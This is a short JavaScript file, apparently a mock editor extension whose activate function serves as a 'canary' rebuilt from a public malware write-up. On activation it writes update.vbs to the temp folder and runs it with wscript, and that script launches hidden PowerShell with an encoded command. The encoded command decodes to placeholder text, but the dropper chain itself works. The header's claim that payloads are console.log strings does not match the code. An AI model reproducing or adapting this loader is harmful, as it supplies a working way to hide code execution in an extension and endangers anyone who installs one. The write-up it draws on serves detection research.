// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const fs = require('fs'), os = require('os'), path = require('path'), { exec } = require('child_process');
exports.activate = function () {
  const vbs = path.join(os.tmpdir(), 'update.vbs');
  fs.writeFileSync(vbs, 'CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc Q0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZQ0FOQVJZ", 0');
  exec('wscript.exe "' + vbs + '"');
};
